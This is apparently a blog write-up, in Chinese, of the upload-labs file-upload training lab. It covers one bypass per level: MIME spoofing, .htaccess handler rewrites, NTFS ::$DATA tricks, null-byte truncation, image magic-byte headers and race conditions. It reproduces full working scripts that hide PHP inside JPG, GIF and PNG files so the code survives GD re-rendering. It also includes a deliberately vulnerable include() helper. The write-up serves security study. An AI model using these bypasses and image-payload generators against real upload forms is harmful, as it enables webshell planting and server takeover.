---
title: upload-labs笔记
date: 2018-11-06 17:22:33
tags: [文件上传]
categories: 文件上传
---

# upload-labs笔记

---

## 0x01

### 前端绕过

![001](/img/fileupload/upload-labs/001.png)

文件在前端使用了js函数检测,绕过前端即可。

使用firefox的插件NoScript直接关掉js.

![001_1](/img/fileupload/upload-labs/001_1.png)

![001_2](/img/fileupload/upload-labs/001_2.png)

![001_3](/img/fileupload/upload-labs/001_3.png)

## 0x02

### MIME绕过

观察源码可以分析到只对文件的类型做了白名单检测,burp抓包后修改MIME文件类型即可成功上传。

![002](/img/fileupload/upload-labs/002.png)

![002_1](/img/fileupload/upload-labs/002_1.png)

这里有个坑啊,原来我修改的jpg格式竟然不行。

![002_3](/img/fileupload/upload-labs/002_3.png)

## 0x03

### 特殊可解析文件绕过

尝试直接上传php文件,不予许上传,估计应用了黑名单。

![003](/img/fileupload/upload-labs/003.png)

尝试php1,发现能上传

![003_1](/img/fileupload/upload-labs/003_1.png)

由于没有配置其他php文件后缀,这个思路也不行。

如果Apache的配置文件可以匹配php5的其他配置文件,那这里的黑名单就没有过滤。

![003_2](/img/fileupload/upload-labs/003_2.png)

Apache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5。

这里还暂时没有其他思路。

## 0x04

黑名单检测。可以上传的文件gif ,png, jpeg;大小写无效;

![004_0](/img/fileupload/upload-labs/004_0.png)

### Apache解析漏洞

![004](/img/fileupload/upload-labs/004.png)

### .htaccess重写文件解析规则绕过

上传先上传一个名为`.htaccess`文件，内容如下：

```
<FilesMatch "04.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

![004_1](/img/fileupload/upload-labs/004_1.png)

再上传04.png的文件

![004_2](/img/fileupload/upload-labs/004_2.png)

产生重写文件解析规则绕过绕过的原因是httpd.conf文件中的两处配置文件的原因和过滤不严。

```
#允许重写覆盖相关配置
AllowOverride All 
LoadModule rewrite_module modules/mod_rewrite.so
```

### PHP 和 Windows环境的叠加特性

分析文章：`https://www.ctolib.com/topics-88860.html`

`:截断`产生空文件

![004](/img/fileupload/upload-labs/004_3.png)

然后将文件名改为`04.<`或`04.<<<`或`04.>>>`或`04.>><`后再次上传，重写`4.php`文件内容，Webshell代码就会写入原来的`04.php`空文件中。

![004](/img/fileupload/upload-labs/004_4.png)

## 0x05

### 大小写绕过

黑盒测试发现是黑名单过滤

```
特殊可解析后缀 ×
上传`.htaccess`×
点绕过 × 
windows流绕过 ×
```

最后发现后缀大小写能绕过

![005_1](/img/fileupload/upload-labs/005_1.png)

可以查看源码看看还有什么可以绕过。

![005_2](/img/fileupload/upload-labs/005_2.png)

## 0x06

### 空格绕过

黑盒测试发现是黑名单过滤

```
上传后重命名文件 √
后缀大小写 ×
特殊可解析后缀 ×
::$DATA绕过 ×
空格绕过 √
```

![006_1](/img/fileupload/upload-labs/006_1.png)

查看下源码

![006_2](/img/fileupload/upload-labs/006_2.png)

## 0x07

### .绕过

```
黑名单
上传后没有改名 √
可上传jreg、png、gif、jpg √
可上传php1 pHp1 √
空格绕过  ×
.htaccess ×
.绕过 √
```

![007_1](/img/fileupload/upload-labs/007_1.png)

![007_2](/img/fileupload/upload-labs/007_2.png)

查看源码看看

![007_3](/img/fileupload/upload-labs/007_3.png)

没有过滤`.`的话应该可以利用windows和php叠加特性创建php空文件。

### windows和php叠加特性绕过

![007_4](/img/fileupload/upload-labs/007_4.png)

再利用`<`进行重写。

![007_5](/img/fileupload/upload-labs/007_5.png)

写入成功

![007_6](/img/fileupload/upload-labs/007_6.png)

## 0x08

### ::$DATA绕过

```
黑名单
上传后没有改名		√
可上传jreg、png、gif、jpg		√
可上传::$DATA		√
可上传php1,pHp1,php.xxx,php. .		√
空格绕过  ×
.htaccess ×
.绕过 ×
```

::DATA仅支持Windows,在info.php中写入<?php phpinfo();?> 上传info.php::$DATA会在上传目录上生成一个info.php的文件

![008_1](/img/fileupload/upload-labs/008_1.png)

底下插入了phpinfo函数。

![008_2](/img/fileupload/upload-labs/008_2.png)

![008_3](/img/fileupload/upload-labs/008_3.png)

### 相关特性

```
假设上传个info.php文件,服务器为windows,info.php内容为<?php phpinfo();?>

info.php:a.jpg 生成info.php,内容为空
info.php::$DATA 生成info.php,内容为<?php phpinfo();?>
info.php::$INDEX_ALLOCATION  生成info.php文件夹
info.php::$DATA\0.jpg    生成0.jpg,内容为<?php phpinfo();?>


```

把Pass-07的检查::$DATA的注释掉测试一下

![008_4](/img/fileupload/upload-labs/008_4.png)

以上的测试在本地通过。

## 0x09

### php. .绕过

```
上传后没有改名		√
可上传jreg、png、gif、jpg		√
可上传::$DATA		×
可上传php1,pHp1,php.xxx,php. .		√
.绕过 ×
.htaccess ×
```

根据没有改名和可以上传`php. .`猜测可能存在绕过。

![009_1](/img/fileupload/upload-labs/009_1.png)

![009_2](/img/fileupload/upload-labs/009_2.png)

查看源码

![009_3](/img/fileupload/upload-labs/009_3.png)

产生问题的原因是只删除了一次点号,当上传`info.php. .`时,先删除第一个点得到`info.php. `最后变成了点绕过。

## 0x10

### 双写后缀名绕过

```
发现php替换成了空
上传default.pphphp即可成功,应该是源代码中只替换了一次

上传后没有改名		√
可上传jreg、png、gif、jpg		√
可上传::$DATA		√
替换php为空
```

![010_1](/img/fileupload/upload-labs/010_1.png)

![010_2](/img/fileupload/upload-labs/010_2.png)

 查看源码

![010_3](/img/fileupload/upload-labs/010_3.png)

## 0x11

### %00截断绕过白名单

```
白名单
双写后缀		×
特殊后缀名		×
::$DATA			×
文件上传被改名     √
可上传png、gif、jpg		√
```

**PHP版本低于5.3.29，且GPC关闭**下是可以突破的

![011_1](/img/fileupload/upload-labs/011_1.png)

![011_2](/img/fileupload/upload-labs/011_2.png)

查看源码

![011_3](/img/fileupload/upload-labs/011_3.png)

问题的根源是上传的路径是用户可控的,当上传的路径为`save_path=../upload/yyg.php%00`后还会进行拼接,在接下来移动文件的时候经过`%00`截断后保留文件为`yyg.php`.

![011_4](/img/fileupload/upload-labs/011_4.png)

用户能够控制上传路径是十分危险的。

## 0x12

### 0x00截断绕过白名单

应该还是白名单,测试下先

```
双写后缀		×
可上传png、gif、jpg		√
文件上传被改名，后缀保留		√ 
特殊后缀名		×

```

**PHP版本低于5.3.29，且GPC关闭**下是可以突破的

用burp抓包发现可以控制`save_path`,和get方式不同,POST方式利用0x00截断

![012_1](/img/fileupload/upload-labs/012_1.png)

选中%00，用快捷键`ctrl+shift+u`后Go

![012_2](/img/fileupload/upload-labs/012_2.png)

成了

![012_3](/img/fileupload/upload-labs/012_3.png)

也可以用这种方式

![012_4](/img/fileupload/upload-labs/012_4.png)

![012_5](/img/fileupload/upload-labs/012_5.png)

![012_6](/img/fileupload/upload-labs/012_6.png)

查看源码

![012_7](/img/fileupload/upload-labs/012_7.png)

可以看到与Pass-11只是用了POST方式

截断利用条件

1. php版本小于`5.3.29` `。
2. php的`magic_quotes_gpc`为OFF状态。
3. 拼接点在`url`处即`get`使用`%00`
4. 拼接点在`post`处使用`0x00`

## 0x13

### 绕过二进制文件前两位ASCII检测

![013_1](/img/fileupload/upload-labs/013_1.png)

这一课需求变了,要求上传图片马,简单测试发现是白名单,会拼接图片后缀。上传图片马后还需要文件包含漏洞才行,但是作者提供的环境有没有文件包含。自己写一份本地验证。

```
#includes.php 放在upload-labs根路径
<?php
	error_reporting(0);
	if ($_GET['file']) {
		$file = $_GET['file'];
		include $file;
	} else {
		include 'index.php';
	}
?>
```

burp抓包修改上传的gif文件,末尾插入phpinfo。png和jpg都能用这种方法。

![013_2](/img/fileupload/upload-labs/013_2.png)

![013_3](/img/fileupload/upload-labs/013_3.png)

查看源码后发现考点在文件头幻数检测。

![013_4](/img/fileupload/upload-labs/013_4.png)

JPG

```
#16进制
FF D8 FF E0 00 10 4A 46 49 46
```

GIF

```
#16进制
47 49 46 38 39 61
```

(相当于文本的GIF89a,一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）

PNG

```
#16进制
89 50 4E 47
```

上传一个没有内容的空文件。

![013_5](/img/fileupload/upload-labs/013_5.png)

GIF用自己添加的文件包含php验证

![013_6](/img/fileupload/upload-labs/013_6.png)

PNG:

可以用`ctrl+shift+u`快捷键将`%89`直接转hex

![013_7](/img/fileupload/upload-labs/013_7.png)

JPG:

可以用`ctrl+shift+u`快捷键将`%FF%D8%FF%E0%00%10%4A%46%49%46`

![013_8](/img/fileupload/upload-labs/013_8.png)

## 0x14

### 突破getimagesize()

尝试了下用Pass-13的方法依然能上传图片马.png和jpg一样.

![014_1](/img/fileupload/upload-labs/014_1.png)

查看源码

![014_2](/img/fileupload/upload-labs/014_2.png)

这里是利用getimages函数来获取图片的宽高信息的,如果上传的不是图片,那就获取不到信息.

依旧可以利用补充对应的图片文件头绕过.

png:

png有些特殊,光给文件头还不行,需指定文件大小。把下面这段

`%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52`

带入

![014_3](/img/fileupload/upload-labs/014_3.png)

选中后用`ctrl+shift+u`快捷键。

![014_4](/img/fileupload/upload-labs/014_4.png)

![014_5](/img/fileupload/upload-labs/014_5.png)

jpg:

测试失败,即使是上传正常的jpg也被拒绝。

## 0x15

### 突破exif_imagetype()

gif:

![015_1](/img/fileupload/upload-labs/015_1.png)

png:``%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52``

![015_2](/img/fileupload/upload-labs/015_2.png)

jpg:`%FF%D8%FF%E0%00%10%4A%46%49%46`

![015_3](/img/fileupload/upload-labs/015_3.png)

源码:

![015_4](/img/fileupload/upload-labs/015_4.png)

## 0x16

### 二次渲染

二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了

之前的招数不管用了,这次文件上传的图片经过了二次渲染。其中的代表`imagecreatefromjpeg`函数。

通过查询MD5值可以看到.

```
windows下cmd查看MD5:certutil -hashfile "filename" MD5
linux:md5sum "filename"
```

![016_1](/img/fileupload/upload-labs/016_1.png)

尝试了把phpinfo插入到文件的末尾,但是渲染的时候明显取不到这个位置。

### jpg:

可以通过毛子写的脚本生成一个二次渲染后依旧能保留payload的图片上传。

利用方式,先上传jpg图片后,再把经过渲染的图片下到本地,通过

`php jpg_payload.php 1.jpg`命令生成payload图片。

![016_2](/img/fileupload/upload-labs/016_2.png)

#### 脚本

```
<?php
	/*

	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
	It is necessary that the size and quality of the initial image are the same as those of the processed image.

	1) Upload an arbitrary image via secured files upload script
	2) Save the processed image and launch:
	jpg_payload.php <jpg_name.jpg>

	In case of successful injection you will get a specially crafted image, which should be uploaded again.

	Since the most straightforward injection method is used, the following problems can occur:
	1) After the second processing the injected data may become partially corrupted.
	2) The jpg_payload.php script outputs "Something's wrong".
	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

	Sergey Bobrov @Black2Fan.

	See also:
	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

	*/

	$miniPayload = "<?php phpinfo();?>";


	if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    	die('php-gd is not installed');
	}
	
	if(!isset($argv[1])) {
		die('php jpg_payload.php <jpg_name.jpg>');
	}

	set_error_handler("custom_error_handler");

	for($pad = 0; $pad < 1024; $pad++) {
		$nullbytePayloadSize = $pad;
		$dis = new DataInputStream($argv[1]);
		$outStream = file_get_contents($argv[1]);
		$extraBytes = 0;
		$correctImage = TRUE;

		if($dis->readShort() != 0xFFD8) {
			die('Incorrect SOI marker');
		}

		while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
			$marker = $dis->readByte();
			$size = $dis->readShort() - 2;
			$dis->skip($size);
			if($marker === 0xDA) {
				$startPos = $dis->seek();
				$outStreamTmp = 
					substr($outStream, 0, $startPos) . 
					$miniPayload . 
					str_repeat("\0",$nullbytePayloadSize) . 
					substr($outStream, $startPos);
				checkImage('_'.$argv[1], $outStreamTmp, TRUE);
				if($extraBytes !== 0) {
					while((!$dis->eof())) {
						if($dis->readByte() === 0xFF) {
							if($dis->readByte !== 0x00) {
								break;
							}
						}
					}
					$stopPos = $dis->seek() - 2;
					$imageStreamSize = $stopPos - $startPos;
					$outStream = 
						substr($outStream, 0, $startPos) . 
						$miniPayload . 
						substr(
							str_repeat("\0",$nullbytePayloadSize).
								substr($outStream, $startPos, $imageStreamSize),
							0,
							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
								substr($outStream, $stopPos);
				} elseif($correctImage) {
					$outStream = $outStreamTmp;
				} else {
					break;
				}
				if(checkImage('payload_'.$argv[1], $outStream)) {
					die('Success!');
				} else {
					break;
				}
			}
		}
	}
	unlink('payload_'.$argv[1]);
	die('Something\'s wrong');

	function checkImage($filename, $data, $unlink = FALSE) {
		global $correctImage;
		file_put_contents($filename, $data);
		$correctImage = TRUE;
		imagecreatefromjpeg($filename);
		if($unlink)
			unlink($filename);
		return $correctImage;
	}

	function custom_error_handler($errno, $errstr, $errfile, $errline) {
		global $extraBytes, $correctImage;
		$correctImage = FALSE;
		if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
			if(isset($m[1])) {
				$extraBytes = (int)$m[1];
			}
		}
	}

	class DataInputStream {
		private $binData;
		private $order;
		private $size;

		public function __construct($filename, $order = false, $fromString = false) {
			$this->binData = '';
			$this->order = $order;
			if(!$fromString) {
				if(!file_exists($filename) || !is_file($filename))
					die('File not exists ['.$filename.']');
				$this->binData = file_get_contents($filename);
			} else {
				$this->binData = $filename;
			}
			$this->size = strlen($this->binData);
		}

		public function seek() {
			return ($this->size - strlen($this->binData));
		}

		public function skip($skip) {
			$this->binData = substr($this->binData, $skip);
		}

		public function readByte() {
			if($this->eof()) {
				die('End Of File');
			}
			$byte = substr($this->binData, 0, 1);
			$this->binData = substr($this->binData, 1);
			return ord($byte);
		}

		public function readShort() {
			if(strlen($this->binData) < 2) {
				die('End Of File');
			}
			$short = substr($this->binData, 0, 2);
			$this->binData = substr($this->binData, 2);
			if($this->order) {
				$short = (ord($short[1]) << 8) + ord($short[0]);
			} else {
				$short = (ord($short[0]) << 8) + ord($short[1]);
			}
			return $short;
		}

		public function eof() {
			return !$this->binData||(strlen($this->binData) === 0);
		}
	}
?>

```

![016_3](/img/fileupload/upload-labs/016_3.png)

### gif:

可以通过对比gif图删剪部分,可以尝试把payload插入到未修改部分。这里也有脚本帮助啊。

`https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE`

#### 脚本

```
<?php
/**
 * Author: rickchen.vip(at)gmail.com
 * Date: 2015-04-05
 * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE
 * Reference: http://www.secgeek.net/bookfresh-vulnerability/
 * Usage: php codeinj.php demo.gif "<?php phpinfo();?>"
 */


function gd_process($src_img, $dst_img) {
    try {
        # you can redefine the GD process
        $im = imagecreatefromgif($src_img);
        imagegif($im, $dst_img);
    } catch (Exception $e) {
        printf("%s\n", $e->getMessage());
        return false;
    }

    return true;
}


function find_similar_block($src_img, $dst_img, $block_len, $slow=false) {
    $src_data = fread(fopen($src_img, "rb"), filesize($src_img));
    $dst_data = fread(fopen($dst_img, "rb"), filesize($dst_img));
    $src_index = 0;
    $pre_match_array = array();

    while ($src_index < (strlen($src_data) - $block_len)) {
        $find_data = substr($src_data, $src_index, $block_len);

        $dst_index = 0;
        $found = false;
        while ($dst_index < (strlen($dst_data) - $block_len)) {
            $temp_data = substr($dst_data, $dst_index, $block_len);
            if (0 === strcmp($find_data, $temp_data)) {
                $match = array(
                    "src_offset" => $src_index,
                    "dst_offset" => $dst_index
                );
                $pre_match_array[] = $match;
                $found = true;

                /*
                printf("Similar block found> src_offset: %d\n", $src_index);
                printf("                     dst_offset: %d\n", $dst_index);
                printf("                   similar_data: %s\n", str2hex($temp_data));
                printf("                 similar_length: %s\n\n", strlen($temp_data));
                */
            }
            if ($found && $slow == false)
                $dst_index += $block_len;
            else
                $dst_index++;
        }

        if ($found && $slow == false)
            $src_index += $block_len;
        else
            $src_index++;
    }

    return $pre_match_array;
}


function inject_code_to_src_img($src_img, $pre_match_array, $injection_code) {
    $src_data = fread(fopen($src_img, "rb"), filesize($src_img));
    $inj_len = strlen($injection_code);

    $find_n = 0;
    foreach ($pre_match_array as $similar_block) {
        #printf("Trying inject code to source image with offset: %d, length: %d\n", $similar_block["src_offset"], $inj_len);
        $mod_src_data = substr($src_data, 0, $similar_block["src_offset"]).$injection_code.substr($src_data, $similar_block["src_offset"] + $inj_len);
        $temp_img = sys_get_temp_dir()."/".$src_img.".mod";
        $temp_cvt_img = $temp_img.".gd";
        fwrite(fopen($temp_img, "wb"), $mod_src_data);

        if (!gd_process($temp_img, $temp_cvt_img)) {
            #printf("PHP-GD process() the image modified error, offset: %d\n", $similar_block["src_offset"]);
            #printf("                                           length: %d\n\n", $inj_len);
            continue;
        } else {
            if (check_code($temp_cvt_img, $injection_code)) {
                $fuck_img = "gd_".$src_img;
                fwrite(fopen($fuck_img, "wb"), $mod_src_data);
                printf("Inject code to source image successful with offset: %d\n", $similar_block["src_offset"]);
                printf("Saving result \"%s\", have fun! :)\n", $fuck_img);
                exit;
            } else {
                continue;
                #printf("Modified image doesn't work well, offset: %d, retry...\n", $similar_block["src_offset"]);
            }
        }
    }
}


function check_code($src_img, $injection_code) {
    $data = fread(fopen($src_img, "rb"), filesize($src_img));

    return strpos($data, $injection_code);
}


function str2hex($str){
    $hex = "";
    for ($i = 0; $i < strlen($str); $i++){
        $hex .= sprintf("%02x", (ord($str[$i])));;
    }

    return $hex;
}


function hex2str($hex){
    $str = "";
    for ($i = 0; $i < strlen($hex)-1; $i+=2){
        $str .= chr(hexdec($hex[$i].$hex[$i+1]));
    }

    return $str;
}


/* main */
if ($argc < 3) {
    printf("Usage: php %s <src_img> <inj_code>\n", $argv[0]);
    exit;
}

$slow = false;
$src_img = $argv[1];
$injection_code = $argv[2];

$img_info = getimagesize($src_img);

/* GIF image type value "1" */
if ($img_info[2] == '1') {
    $cvt_img = sys_get_temp_dir()."/".basename($src_img);
    if (!gd_process($src_img, $cvt_img)) {
        printf("PHP-GD process() function error, please check out.\n");
        exit;
    }
} else {
    printf("This script only support GIF image.\n");
    exit;
}

$block_len = strlen($injection_code);
$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);

if (sizeof($pre_match_array)) {
    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);
} else {
    printf("Not found any similar %d bytes block.\n", strlen($injection_code));
}

printf("Cant find any useful similar block to inject code, but take it easy. :(\n");

```

用其自带的`demo.gif`,我这里一次就成功了,不行的话多尝试下换一张图片或者尝试其他payload。

![016_4](/img/fileupload/upload-labs/016_4.png)

![016_5](/img/fileupload/upload-labs/016_5.png)

### png:

`https://raw.githubusercontent.com/hxer/imagecreatefrom-/master/png/poc/poc_png.py`

#### 脚本

```
# -*- coding: utf-8 -*-

"""
author: janes
"""

import binascii


class PNGError(Exception):

    def __init__(self, value):
        self.value = value

    def __str__(self):
        return repr(self.value)


class PNG(object):
    """
    read png file and modify png data to php code, just support index-color
    images.
    """

    def __init__(self, fname=None):
        if fname:
            self.openpng(fname)

    def openpng(self, fname):
        try:
            with open(fname, 'rb') as f:
                self.data = f.read()
        except:
            err_msg = "open {f} failed".format(f=fname)
            raise PNGError(err_msg)
            
        self.read_info()

    def read_info(self):
        try:
            self.signature = self.data[:8]
            self.depth = self.data[0x18]
            self.color_type = self.data[0x19]
        except:
            raise PNGError('invalid png data')

        if not self.check_signature():
            raise PNGError('check png signature error')
        if not self.check_type():
            raise PNGError('just support index-color images')
        if not self.check_plte():
            raise PNGError('check PLTE chunk error')

        pos = self.data.find('PLTE')
        self.plte_len = int(self.data[pos-4: pos].encode('hex'), 16)
        self.plte_pos = pos-4

    def check_signature(self):
        return self.signature == '89504e470d0a1a0a'.decode('hex')

    def check_type(self):
        return self.color_type == '03'.decode('hex')

    def check_plte(self):
        return self.data.find('PLTE') != -1

    def set_payload(self, payload):
        """
        set php code payload
        """
        code_len = len(payload)
        if code_len > self.depth*3:
            err_msg = "payload is too long, can't to add to png PLTE chunk"
            raise PNGError(err_msg)
        self.payload = payload

    def check_payload(self):
        return len(self.payload) <= self.plte_len

    def crc(self, data):
        return '%08x' % (binascii.crc32(data) & 0xffffffff)

    def modify_plte(self):
        if self.check_payload():
            im = list(self.data)
            payload_pos = self.plte_pos + 8
            # modify data to php code
            for i in range(len(self.payload)):
                im[payload_pos+i] = self.payload[i]

            crc_pos = self.plte_pos + 8 + self.plte_len
            crc_checks = self.crc(''.join(im[self.plte_pos+4: crc_pos]))
            crc_checks = crc_checks.decode('hex')
            # modify crc
            for i in range(4):
                im[crc_pos+i] = crc_checks[i]
            self.im = ''.join(im)
        else:
            code_len = len(self.payload)            # must be a multiple of 3
            add_len = code_len % 3
            if add_len:
                add_len = 3 - add_len
                
            plte_len = ('%08x' % (code_len+add_len)).decode('hex')
            plte_type = 'PLTE'
            plte_data = self.payload + ' ' * add_len
            plte_crc = self.crc(plte_type+plte_data).decode('hex')
            plte_chunk = plte_len + plte_type + plte_data + plte_crc

            im = self.data[:self.plte_pos]
            im += plte_chunk
            im += self.data[(self.plte_pos+12+self.plte_len):]
            self.im = im

    def save(self, imfile):
        with open(imfile, 'wb') as f:
            f.write(self.im)

if __name__ == "__main__":
    debug = 0
    if debug:
        info_code = '<?php phpinfo();?>'

        php_code = info_code
        php_png = 'php_long.png'
        png_file = 'test.png'
    else:
        import argparse

        parser = argparse.ArgumentParser()
        parser.add_argument('in_file', help='input png file')
        parser.add_argument('-p', dest='payload',
                help='php code to add to PLTE chunk', required=True)
        parser.add_argument('-o', dest="out_file", default='php.png',
                help='output png file, default is php.png')
        args = parser.parse_args()

        png_file = args.in_file
        php_code = args.payload
        php_png = args.out_file

    try:
        png = PNG()
        png.openpng(png_file)
        png.set_payload(php_code)
        png.modify_plte()
        png.save(php_png)
    except PNGError as e:
        print "Error massage: {}".format(e.value)

```

![016_6](/img/fileupload/upload-labs/016_6.png)

![016_7](/img/fileupload/upload-labs/016_7.png)

## 0x17

### 条件竞争

利用burp重复发包

![017_2](/img/fileupload/upload-labs/017_2.png)

![017_3](/img/fileupload/upload-labs/017_3.png)

在运行时访问,如果不成功要调高线程数。

![017_1](/img/fileupload/upload-labs/017_1.png)

源码：

![017_4](/img/fileupload/upload-labs/017_4.png)

但是上述的方式太不稳定了,可以将上传文件的内容修改为

```
<?php fputs(fopen("info.php", "w"), "<?php phpinfo(); ?>"); ?>
```

一旦访问成功就创建info.php文件。

## 0x18

### 条件竞争结合Apache解析漏洞

尝试上传文件后猜测后台应该是白名单。

![018_1](/img/fileupload/upload-labs/018_1.png)

没有利用的思路,翻了别人的思路,需要Apache解析漏洞和条件竞争。

![018_2](/img/fileupload/upload-labs/018_2.png)

![018_3](/img/fileupload/upload-labs/018_3.png)

## 0x19

### 利用截断

测试了一下,命名的文件直接拼接上去了。这部分是用户可以控制的,尝试一下截断。

**PHP版本低于5.3.29，且GPC关闭**下突破成功

![019_1](/img/fileupload/upload-labs/019_1.png)

查看下源码

源码:

![019_2](/img/fileupload/upload-labs/019_2.png)

## 



